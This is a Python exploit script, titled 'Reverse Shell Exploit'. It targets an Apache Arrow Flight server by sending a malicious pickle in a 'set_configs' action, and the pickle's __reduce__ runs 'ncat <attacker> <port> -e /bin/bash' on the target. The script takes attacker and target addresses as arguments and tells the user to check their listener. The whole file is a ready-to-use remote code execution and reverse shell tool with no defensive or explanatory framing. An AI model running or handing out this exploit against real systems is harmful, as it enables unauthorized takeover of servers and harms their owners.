import pickle
import pyarrow.flight as flight
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Exploit')
    parser.add_argument('-lhost', '--lhost', required=True, help='Attacker IP address')
    parser.add_argument('-lport', '--lport', required=True, type=int, help='Attacker port')
    parser.add_argument('-rhost', '--rhost', required=True, help='Target server IP')
    parser.add_argument('-rport', '--rport', required=True, type=int, help='Target server port')
    
    args = parser.parse_args()
    
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, (f'ncat {args.lhost} {args.lport} -e /bin/bash',))
    
    action_body = pickle.dumps(RCE())
    action = flight.Action("set_configs", action_body)
    
    client = flight.connect(f"grpc+tcp://{args.rhost}:{args.rport}")
    print(f"Sending reverse shell exploit to {args.rhost}:{args.rport}...")
    result = client.do_action(action)
    print("Reverse shell payload sent - check your listener!")

if __name__ == "__main__":
    main()